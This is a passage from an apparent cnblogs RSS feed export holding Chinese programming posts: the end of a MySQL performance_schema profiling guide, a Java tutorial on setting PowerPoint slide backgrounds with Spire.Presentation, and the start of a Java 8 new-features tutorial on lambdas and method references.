&lt;p&gt;　　事件的分类，stages是步骤，一个语句在服务器执行的过程步骤，结果和profile一样，profile方式不推荐，因为后面会去掉。transaction是事务的事件收集等。&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;4 &lt;/span&gt;&lt;strong&gt;setup_instruments　&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　这个就是主要的事件监控仪器，如下：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/46403/201903/46403-20190307133908886-517184006.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　5 最后就是setup_timers，配合performance_timers定义那些仪器分类是的时间类型，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/46403/201903/46403-20190307134031825-1038392217.png&quot; alt=&quot;&quot;/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/46403/201903/46403-20190307134054313-1927361819.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;CYCLE:cpu时钟，TIMER_FREQUENCY是一秒有多少，TIMER_RESOLUTION是每次增加多少，最后是多久获取一次这个时间。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;三 利用performance_schema获取priofile数据&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;开启相关的instrument:&lt;/p&gt;
&lt;p&gt;我们看上面 instrument分类表&lt;strong&gt;setup_consumers&lt;/strong&gt;中的信息，关于stage的行都是NO，那么我们需要改为YES，同时一会需要拿statements监控表中的信息，所以也需要开启statements：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;UPDATE&lt;/span&gt; setup_consumers &lt;span&gt;SET&lt;/span&gt; ENABLED &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;YES&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
       &lt;span&gt;WHERE&lt;/span&gt; NAME &lt;span&gt;LIKE&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;%stage%&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;UPDATE&lt;/span&gt; setup_consumers &lt;span&gt;SET&lt;/span&gt; ENABLED &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;YES&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;WHERE&lt;/span&gt; NAME &lt;span&gt;LIKE&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;%statements%&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;然后把stage的instrument开启&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;UPDATE&lt;/span&gt; performance_schema.setup_instruments &lt;span&gt;SET&lt;/span&gt; ENABLED &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;YES&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, TIMED &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;YES&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
       &lt;span&gt;WHERE&lt;/span&gt; NAME &lt;span&gt;LIKE&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;%stage/%&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;;   &lt;span&gt;--&lt;/span&gt;&lt;span&gt; 开启所有执行步骤的监控&lt;/span&gt;
&lt;span&gt;UPDATE&lt;/span&gt; performance_schema.setup_instruments &lt;span&gt;SET&lt;/span&gt; ENABLED &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;YES&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, TIMED &lt;span&gt;=&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;YES&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;WHERE&lt;/span&gt; NAME &lt;span&gt;LIKE&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;%statement/%&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt; 执行依据sql&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; quartz.TestOne
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;查询这条语句的queryid：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;SELECT&lt;/span&gt; EVENT_ID, &lt;span&gt;TRUNCATE&lt;/span&gt;(TIMER_WAIT&lt;span&gt;/&lt;/span&gt;&lt;span&gt;1000000000000&lt;/span&gt;,&lt;span&gt;6&lt;/span&gt;) &lt;span&gt;as&lt;/span&gt;&lt;span&gt; Duration, SQL_TEXT
       &lt;/span&gt;&lt;span&gt;FROM&lt;/span&gt; performance_schema.events_statements_history_long &lt;span&gt;WHERE&lt;/span&gt; SQL_TEXT &lt;span&gt;like&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;%quartz%&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/46403/201903/46403-20190307141623446-690700483.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;那么id就是509&lt;/p&gt;
&lt;p&gt;然后执行性能监控表：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;SELECT&lt;/span&gt; event_name &lt;span&gt;AS&lt;/span&gt; Stage, &lt;span&gt;TRUNCATE&lt;/span&gt;(TIMER_WAIT&lt;span&gt;/&lt;/span&gt;&lt;span&gt;1000000000000&lt;/span&gt;,&lt;span&gt;6&lt;/span&gt;) &lt;span&gt;AS&lt;/span&gt;&lt;span&gt; Duration
       &lt;/span&gt;&lt;span&gt;FROM&lt;/span&gt; performance_schema.events_stages_history_long &lt;span&gt;WHERE&lt;/span&gt; NESTING_EVENT_ID&lt;span&gt;=&lt;/span&gt;&lt;span&gt;509&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/46403/201903/46403-20190307141738985-1375520256.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;内容和老版本的profile结果一样。&lt;/p&gt;
&lt;p&gt;主要看下stage/sql/Sending data这一行，这一行是主要io相关的事件，一般情况下，sql慢了，而这一行数值比较大，那肯定硬盘读数据慢了或者有锁冲突。&lt;/p&gt;
&lt;p&gt;那么就是用error log，有死锁，mysql会将死锁信息打入error日志，show engine innodb status只是全局的一些信息，如果要想看详细的再去监控对应的instrument。&lt;/p&gt;
&lt;p&gt;而且目前mysql8多支持NOWAIT和skiplocked两个语句，用法还是select.. from 表明 for update/for nowait等，非常灵活的解决了死锁的处理方式，当然你也可以让其事务隔离级别为脏读级别&lt;/p&gt;
&lt;p&gt;，但是并不能解决更多的业务类型，设置死锁超时也是一个可行的办法。&lt;/p&gt;




</description>
<pubDate>Thu, 07 Mar 2019 06:55:00 +0000</pubDate>
<dc:creator>无为有道</dc:creator>
<og:description>一 简介 咱们先不说cpu的频率，内存的大小（这个和索引一样重要，但不是本文讨论的内容），硬盘的寻道时间。想起mysql的调优，最起码的必须知道explain执行计划，慢sql日志，老旧的profil</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/ck0074451665/p/10489649.html</dc:identifier>
</item>
<item>
<title>Java设置PPT幻灯片背景——纯色、渐变、图片背景 - E-iceblue</title>
<link>http://www.cnblogs.com/Yesi/p/10489623.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Yesi/p/10489623.html</guid>
<description>&lt;p&gt;PPT幻灯片生成时，系统默认是无色背景填充，幻灯片设计需要手动设置背景效果，可设置颜色填充或者图片背景填充。本文将对此介绍具体实现方法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用工具&lt;/strong&gt;：&lt;a href=&quot;https://www.e-iceblue.cn/Introduce/Free-Spire-Presentation-JAVA.html&quot;&gt;Free Spire.Presentation for Java 2.2.3&lt;/a&gt;(免费版)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Jar&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;文件导入方法（参考）：&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;步骤&lt;/strong&gt;&lt;strong&gt;1&lt;/strong&gt;：在Java程序中可新建一个文件夹命名为Lib，并将下载包中的jar文件复制到新建的文件夹下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/706090/201903/706090-20190307143935590-386725356.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;步骤&lt;/strong&gt;&lt;strong&gt;2&lt;/strong&gt;&lt;strong&gt;：&lt;/strong&gt;复制文件后，添加到引用类库：选中这个jar文件，点击鼠标右键，选择“Build Path” – “Add to Build Path”。完成引用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/706090/201903/706090-20190307143949273-495343702.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Java&lt;/strong&gt;&lt;strong&gt;示例&lt;/strong&gt;&lt;strong&gt;1&lt;/strong&gt;&lt;strong&gt;：设置背景颜色&lt;/strong&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;strong&gt;1.&lt;/strong&gt;&lt;strong&gt;纯色背景&lt;/strong&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt; com.spire.presentation.*&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt; com.spire.presentation.drawing.*&lt;span&gt;;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; BackgroundColor {

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(String[] args) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {&lt;br/&gt;String inputFile &lt;/span&gt;= &quot;sample.pptx&quot;&lt;span&gt;;
        String outputFile &lt;/span&gt;= &quot;output/setBackgroundColor.pptx&quot;&lt;span&gt;;
        Presentation ppt &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Presentation();
        ppt.loadFromFile(inputFile);        &lt;br/&gt;ppt.getSlides().get(&lt;/span&gt;0&lt;span&gt;).getSlideBackground().setType(BackgroundType.CUSTOM);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置文档的背景填充模式为纯色填充，设置颜色 &lt;/span&gt;&lt;span&gt;
        ppt.getSlides().get(&lt;/span&gt;0&lt;span&gt;).getSlideBackground().getFill().setFillType(FillFormatType.SOLID);
        ppt.getSlides().get(&lt;/span&gt;0&lt;span&gt;).getSlideBackground().getFill().getSolidColor().setColor(java.awt.Color.PINK);

        ppt.saveToFile(outputFile, FileFormat.PPTX_2010);
        ppt.dispose();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;纯色背景效果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/706090/201903/706090-20190307144243026-592152077.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;2.&lt;/strong&gt;&lt;strong&gt;渐变背景&lt;/strong&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.awt.Color;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt; com.spire.presentation.*&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt; com.spire.presentation.drawing.*&lt;span&gt;;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; BackgroundColor {

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(String[] args) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        String inputFile &lt;/span&gt;= &quot;test.pptx&quot;&lt;span&gt;;
        String outputFile &lt;/span&gt;= &quot;output/setBackgroundColor2.pptx&quot;&lt;span&gt;;
        Presentation ppt &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Presentation();
        ppt.loadFromFile(inputFile);
        ppt.getSlides().get(&lt;/span&gt;0&lt;span&gt;).getSlideBackground().setType(BackgroundType.CUSTOM);

&lt;/span&gt;&lt;span&gt;       //&lt;/span&gt;&lt;span&gt;设置文档的背景填充模式为渐变填充，并设置颜色  &lt;/span&gt;
        ppt.getSlides().get(0).getSlideBackground().getFill().setFillType(FillFormatType.GRADIENT);   &lt;br/&gt;ppt.getSlides().get(0).getSlideBackground().getFill().getGradient().getGradientStops().append(0, Color.white);       &lt;br/&gt;ppt.getSlides().get(0).getSlideBackground().getFill().getGradient().getGradientStops().append(1&lt;span&gt;,Color.green);                
        ppt.saveToFile(outputFile, FileFormat.PPTX_2010);
        ppt.dispose();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;渐变色背景效果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/706090/201903/706090-20190307144558179-1678253991.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Java&lt;/strong&gt;&lt;strong&gt;示例&lt;/strong&gt;&lt;strong&gt;2&lt;/strong&gt;&lt;strong&gt;：图片背景&lt;/strong&gt;&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt; com.spire.presentation.*&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt; com.spire.presentation.drawing.*&lt;span&gt;;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ImageBackground {
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(String[] args) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
    String inputFile &lt;/span&gt;= &quot;Input.pptx&quot;&lt;span&gt;;
    String imageFile &lt;/span&gt;= &quot;1.png&quot;&lt;span&gt;;
    String outputFile &lt;/span&gt;= &quot;output/ImgBackgroundColor.pptx&quot;&lt;span&gt;;
    Presentation ppt &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Presentation();
    ppt.loadFromFile(inputFile);
    ppt.getSlides().get(&lt;/span&gt;0&lt;span&gt;).getSlideBackground().setType(BackgroundType.CUSTOM);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置文档的背景填充模式为图片填充&lt;/span&gt;
    ppt.getSlides().get(0&lt;span&gt;).getSlideBackground().getFill().setFillType(FillFormatType.PICTURE);    
    ppt.getSlides().get(&lt;/span&gt;0&lt;span&gt;).getSlideBackground().getFill().getPictureFill().setAlignment(RectangleAlignment.NONE);
    ppt.getSlides().get(&lt;/span&gt;0&lt;span&gt;).getSlideBackground().getFill().getPictureFill().setFillType(PictureFillType.STRETCH);
    ppt.getSlides().get(&lt;/span&gt;0).getSlideBackground().getFill().getPictureFill().getPicture().setUrl((&lt;span&gt;new&lt;/span&gt;&lt;span&gt; java.io.File(imageFile)).getAbsolutePath());   
    ppt.saveToFile(outputFile, FileFormat.PPTX_2010);
    ppt.dispose();
  }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;图片背景效果：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/706090/201903/706090-20190307144713931-1863453821.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（本文完）&lt;/p&gt;
&lt;p&gt; 转载请注明出处！&lt;/p&gt;
</description>
<pubDate>Thu, 07 Mar 2019 06:51:00 +0000</pubDate>
<dc:creator>E-iceblue</dc:creator>
<og:description>PPT幻灯片生成时，系统默认是无色背景填充，幻灯片设计需要手动设置背景效果，可设置颜色填充或者图片背景填充。本文将对此介绍具体实现方法。 使用工具：Free Spire.Presentation fo</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Yesi/p/10489623.html</dc:identifier>
</item>
<item>
<title>干货 | Java8 新特性教程 - 犬小哈</title>
<link>http://www.cnblogs.com/quanxiaoha/p/10489615.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/quanxiaoha/p/10489615.html</guid>
<description>&lt;blockquote readability=&quot;2.6887417218543&quot;&gt;
&lt;p&gt;本教程翻译整理自 &lt;a href=&quot;https://github.com/winterbe/java8-tutorial&quot; class=&quot;uri&quot;&gt;https://github.com/winterbe/java8-tutorial&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本教程首发自个人网站: &lt;a href=&quot;https://www.exception.site/java8/java8-new-features&quot; class=&quot;uri&quot;&gt;https://www.exception.site/java8/java8-new-features&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;目录&quot;&gt;目录：&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;一、接口内允许添加默认实现的方法&lt;/li&gt;
&lt;li&gt;二、Lambda 表达式&lt;/li&gt;
&lt;li&gt;三、函数式接口 Functional Interface&lt;/li&gt;
&lt;li&gt;四、便捷的引用类的构造器及方法&lt;/li&gt;
&lt;li&gt;五、Lambda 访问外部变量及接口默认方法
&lt;ul&gt;&lt;li&gt;5.1 访问局部变量&lt;/li&gt;
&lt;li&gt;5.2 访问成员变量和静态变量&lt;/li&gt;
&lt;li&gt;5.3 访问接口的默认方法&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;六、内置的函数式接口
&lt;ul&gt;&lt;li&gt;6.1 Predicate 断言&lt;/li&gt;
&lt;li&gt;6.2 Function&lt;/li&gt;
&lt;li&gt;6.3 Supplier 生产者&lt;/li&gt;
&lt;li&gt;6.4 Consumer 消费者&lt;/li&gt;
&lt;li&gt;6.5 Comparator&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;七、Optional&lt;/li&gt;
&lt;li&gt;八、Streams 流
&lt;ul&gt;&lt;li&gt;8.1 Filter 过滤&lt;/li&gt;
&lt;li&gt;8.2 Sorted 排序&lt;/li&gt;
&lt;li&gt;8.3 Map 转换&lt;/li&gt;
&lt;li&gt;8.4 Match 匹配&lt;/li&gt;
&lt;li&gt;8.5 Count 计数&lt;/li&gt;
&lt;li&gt;8.6 Reduce&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;九、Parallel Streams 并行流
&lt;ul&gt;&lt;li&gt;9.1 顺序流排序&lt;/li&gt;
&lt;li&gt;9.2 并行流排序&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;十、Map 集合&lt;/li&gt;
&lt;li&gt;十一、新的日期 API
&lt;ul&gt;&lt;li&gt;11.1 Clock&lt;/li&gt;
&lt;li&gt;11.2 Timezones 时区&lt;/li&gt;
&lt;li&gt;11.3 LocalTime&lt;/li&gt;
&lt;li&gt;11.4 LocalDate&lt;/li&gt;
&lt;li&gt;11.4 LocalDateTime&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;十二、Annotations 注解&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;也希望学完本系列教程的小伙伴能够熟练掌握和应用 Java8 的各种特性，使其成为在工作中的一门利器。废话不多说，让我们一起开启 Java8 新特性之旅吧！&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;★★★ &lt;strong&gt;如果此教程有帮助到你, 去小哈的 GitHub 帮忙 &lt;strong&gt;Star&lt;/strong&gt; 一下吧, 谢谢啦！&lt;/strong&gt; &lt;a href=&quot;https://github.com/weiwosuoai/java8_guide&quot; title=&quot;传送门&quot;&gt;传送门&lt;/a&gt; ★★★&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;接口内允许添加默认实现的方法&quot;&gt;接口内允许添加默认实现的方法&lt;/h2&gt;
&lt;p&gt;Java 8 允许我们通过 &lt;code&gt;default&lt;/code&gt; 关键字对接口中定义的抽象方法提供一个默认的实现。&lt;/p&gt;
&lt;p&gt;请看下面示例代码：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 定义一个公式接口
interface Formula {
    // 计算
    double calculate(int a);

    // 求平方根
    default double sqrt(int a) {
        return Math.sqrt(a);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在上面这个接口中，我们除了定义了一个抽象方法 &lt;code&gt;calculate&lt;/code&gt;，还定义了一个带有默认实现的方法 &lt;code&gt;sqrt&lt;/code&gt;。&lt;br/&gt;我们在实现这个接口时，可以只需要实现 &lt;code&gt;calculate&lt;/code&gt; 方法，默认方法 &lt;code&gt;sqrt&lt;/code&gt; 可以直接调用即可，也就是说我们可以不必强制实现 &lt;code&gt;sqrt&lt;/code&gt; 方法。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;补充：通过 &lt;code&gt;default&lt;/code&gt; 关键字这个新特性，可以非常方便地对之前的接口做拓展，而此接口的实现类不必做任何改动。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Formula formula = new Formula() {
    @Override
    public double calculate(int a) {
        return sqrt(a * 100);
    }
};

formula.calculate(100);     // 100.0
formula.sqrt(16);           // 4.0&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面通过匿名对象实现了 &lt;code&gt;Formula&lt;/code&gt; 接口。但是即使是这样，我们为了完成一个 &lt;code&gt;sqrt(a * 100)&lt;/code&gt; 简单计算，就写了 6 行代码，很是冗余。&lt;/p&gt;
&lt;h2 id=&quot;lambda-表达式&quot;&gt;Lambda 表达式&lt;/h2&gt;
&lt;p&gt;在学习 &lt;code&gt;Lambda&lt;/code&gt; 表达式之前，我们先来看一段老版本的示例代码，其对一个含有字符串的集合进行排序：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;List&amp;lt;String&amp;gt; names = Arrays.asList(&quot;peter&quot;, &quot;anna&quot;, &quot;mike&quot;, &quot;xenia&quot;);

Collections.sort(names, new Comparator&amp;lt;String&amp;gt;() {
    @Override
    public int compare(String a, String b) {
        return b.compareTo(a);
    }
});&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Collections&lt;/code&gt; 工具类提供了静态方法 &lt;code&gt;sort&lt;/code&gt; 方法，入参是一个 &lt;code&gt;List&lt;/code&gt; 集合，和一个 &lt;code&gt;Comparator&lt;/code&gt; 比较器，以便对给定的 &lt;code&gt;List&lt;/code&gt; 集合进行&lt;br/&gt;排序。上面的示例代码创建了一个匿名内部类作为入参，这种类似的操作在我们日常的工作中随处可见。&lt;/p&gt;
&lt;p&gt;Java 8 中不再推荐这种写法，而是推荐使用 Lambda 表达：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Collections.sort(names, (String a, String b) -&amp;gt; {
    return b.compareTo(a);
});&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;正如你看到的，上面这段代码变得简短很多而且易于阅读。但是我们还可以再精炼一点：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Collections.sort(names, (String a, String b) -&amp;gt; b.compareTo(a));&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对于只包含一行方法的代码块，我们可以省略大括号，直接 &lt;code&gt;return&lt;/code&gt; 关键代码即可。追求极致，我们还可以让它再短点：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;names.sort((a, b) -&amp;gt; b.compareTo(a));&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;List&lt;/code&gt; 集合现在已经添加了 &lt;code&gt;sort&lt;/code&gt; 方法。而且 Java 编译器能够根据&lt;strong&gt;类型推断机制&lt;/strong&gt;判断出参数类型，这样，你连入参的类型都可以省略啦，怎么样，是不是感觉很强大呢！&lt;/p&gt;
&lt;h2 id=&quot;函数式接口-functional-interface&quot;&gt;函数式接口 Functional Interface&lt;/h2&gt;
&lt;p&gt;抛出一个疑问：在我们书写一段 Lambda 表达式后（比如上一章节中匿名内部类的 Lambda 表达式缩写形式），Java 编译器是如何进行类型推断的，它又是怎么知道重写的哪个方法的？&lt;/p&gt;
&lt;p&gt;需要说明的是，不是每个接口都可以缩写成 Lambda 表达式。只有那些函数式接口（Functional Interface）才能缩写成 Lambda 表示式。&lt;/p&gt;
&lt;p&gt;那么什么是函数式接口（Functional Interface）呢？&lt;/p&gt;
&lt;p&gt;所谓函数式接口（Functional Interface）就是只包含一个抽象方法的声明。针对该接口类型的所有 Lambda 表达式都会与这个抽象方法匹配。&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;注意：你可能会有疑问，Java 8 中不是允许通过 defualt 关键字来为接口添加默认方法吗？那它算不算抽象方法呢？答案是：不算。因此，你可以毫无顾忌的添加默认方法，它并不违反函数式接口（Functional Interface）的定义。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;总结一下：只要接口中仅仅包含一个抽象方法，我们就可以将其改写为 Lambda 表达式。为了保证一个接口明确的被定义为一个函数式接口（Functional Interface），我们需要为该接口添加注解：&lt;code&gt;@FunctionalInterface&lt;/code&gt;。这样，一旦你添加了第二个抽象方法，编译器会立刻抛出错误提示。&lt;/p&gt;
&lt;p&gt;示例代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;@FunctionalInterface
interface Converter&amp;lt;F, T&amp;gt; {
    T convert(F from);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;示例代码2：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Converter&amp;lt;String, Integer&amp;gt; converter = (from) -&amp;gt; Integer.valueOf(from);
Integer converted = converter.convert(&quot;123&quot;);
System.out.println(converted);    // 123&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;注意：上面的示例代码，即使去掉 &lt;code&gt;@FunctionalInterface&lt;/code&gt; 也是好使的，它仅仅是一种约束而已。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;便捷的引用类的构造器及方法&quot;&gt;便捷的引用类的构造器及方法&lt;/h2&gt;
&lt;p&gt;小伙伴们，还记得上一个章节这段示例代码么：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@FunctionalInterface
interface Converter&amp;lt;F, T&amp;gt; {
    T convert(F from);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Converter&amp;lt;String, Integer&amp;gt; converter = (from) -&amp;gt; Integer.valueOf(from);
Integer converted = converter.convert(&quot;123&quot;);
System.out.println(converted);    // 123&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面这段代码，通过 Java 8 的新特性，进一步简化上面的代码：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Converter&amp;lt;String, Integer&amp;gt; converter = Integer::valueOf;
Integer converted = converter.convert(&quot;123&quot;);
System.out.println(converted);   // 123&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Java 8 中允许你通过 &lt;code&gt;::&lt;/code&gt; 关键字来引用类的方法或构造器。上面的代码简单的示例了如何引用静态方法，当然，除了静态方法，我们还可以引用普通方法：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class Something {
    String startsWith(String s) {
        return String.valueOf(s.charAt(0));
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Something something = new Something();
Converter&amp;lt;String, String&amp;gt; converter = something::startsWith;
String converted = converter.convert(&quot;Java&quot;);
System.out.println(converted);    // &quot;J&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接下来，我们再来看看如何通过 &lt;code&gt;::&lt;/code&gt; 关键字来引用类的构造器。首先，我们先来定义一个示例类，在类中声明两个构造器：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;class Person {
    String firstName;
    String lastName;

    Person() {}

    Person(String firstName, String lastName) {
        this.firstName = firstName;
        this.lastName = lastName;
    }
}&lt;/code&gt;
&lt;/pre&gt;
